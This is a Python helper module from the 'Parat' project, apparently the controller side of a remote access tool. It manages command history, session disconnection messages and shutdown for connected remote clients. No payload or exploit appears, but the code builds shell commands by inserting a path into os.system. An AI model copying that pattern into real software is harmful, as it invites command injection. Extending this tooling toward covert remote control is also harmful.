#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from sys import stdout, stderr
from os import system, chdir
from os.path import isfile
from traceback import print_exc
from random import choice
from string import ascii_letters

from lib.ParatPrint import colorize, pprint
from lib.ParatEncrypt import Encode





def check_history_exist(history_path):
    if not isfile(history_path):
        linux("touch '{}'".format(history_path))


def echo_history(history_path):
    linux("cat -b '{}'".format(history_path))
    pprint("\n")


def rand_str(lenght=5):
    return ''.join(choice(ascii_letters) for _ in range(lenght))


def linux(command):
    system(command)



def show_trace(v):
    if v: print_exc()



def echo_des_message(client_id, lport, cliuser, rip, rport, colors):

    message = colorize(
        "\r[-]Session %s Closed on %d (%s) -> [%s:%d]\n" % \
            (
                client_id,
                lport,
                cliuser,
                rip,
                rport
            ),
        colored=colors,
        color="LRED"
    ); pprint(message)



def disconnect_it(client_id, connections, clients, root_path, logger, colors):

    lport     = int(connections[client_id][5])
    rport     = int(connections[client_id][4])
    rip       = str(connections[client_id][3])
    cliuser   = str(connections[client_id][2])

    for client in connections.keys():

        if client == client_id:
            conn = connections[client][0]

    # socket works
    try:
        conn.send(Encode("disconnect"))
    except:
        pass
    conn.close()

    chdir(root_path)

    logger.info("stop: " + clients[client_id])

    del connections[client_id]
    del clients[client_id]

    echo_des_message(
        client_id,
        lport,
        cliuser,
        rip,
        rport,
        colors
    )




def exit_normally(logger, clients, database, cli_counter, stop_all_threads):

    logger.info("closing parat")

    map(lambda x: x[0].close(), clients.values())

    for cli in clients:
        del cli

    cli_counter = 0
    stop_all_threads = True
    if database is not None: database.close()

    map(lambda std: std.flush(), [stdout, stderr])

    logger.info("finished " + "-"*10 + ">")
    exit(0)
